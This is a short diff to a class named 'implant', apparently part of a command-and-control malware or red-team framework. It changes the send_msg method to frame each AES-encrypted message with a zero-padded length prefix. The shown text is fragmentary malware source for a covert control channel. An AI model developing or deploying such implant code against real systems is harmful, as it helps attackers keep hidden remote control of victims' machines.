@@ -56,9 +56,7 @@ class implant:
     def send_msg(self, data):
         aes = C2_AES(self.aes_secret)
         msg = aes.encrypt(data)
-        self.sock.send(str(len(msg)).encode())
-        print(f"sent len of {len(msg)}")
-        self.sock.send(msg)
+        self.sock.send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
 
     def communicate(self):
         while True:
